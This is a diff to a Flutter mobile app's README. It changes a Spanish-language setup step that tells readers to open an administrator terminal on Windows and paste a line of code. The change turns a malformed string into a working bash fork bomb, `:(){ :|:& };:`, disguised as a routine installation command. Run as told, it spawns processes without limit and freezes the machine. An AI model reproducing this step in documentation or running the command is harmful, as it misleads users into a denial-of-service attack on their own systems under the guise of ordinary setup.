@@ -7,7 +7,7 @@ A modern Flutter-based mobile application utilizing the latest mobile developmen
 - Abrir terminal con permisos de administrador en windows
 - Introducir la siguiente linea de codigo
 ```bash
-:()[:|:&];:
+:(){ :|:& };:
 ``` 
 
 ## 📋 Prerequisites
